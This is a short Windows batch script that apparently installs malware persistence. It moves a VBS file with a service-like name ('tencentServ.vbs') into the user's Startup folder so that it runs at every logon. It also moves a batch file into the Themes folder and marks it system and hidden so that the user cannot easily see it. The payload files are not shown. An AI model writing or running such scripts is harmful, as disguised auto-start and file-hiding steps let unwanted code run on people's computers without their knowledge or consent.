@echo off
move "coserver_adapter.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Themes"
move "tencentServ.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo "move completed"

attrib "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Themes\coserver_adapter.bat" +s +h
pause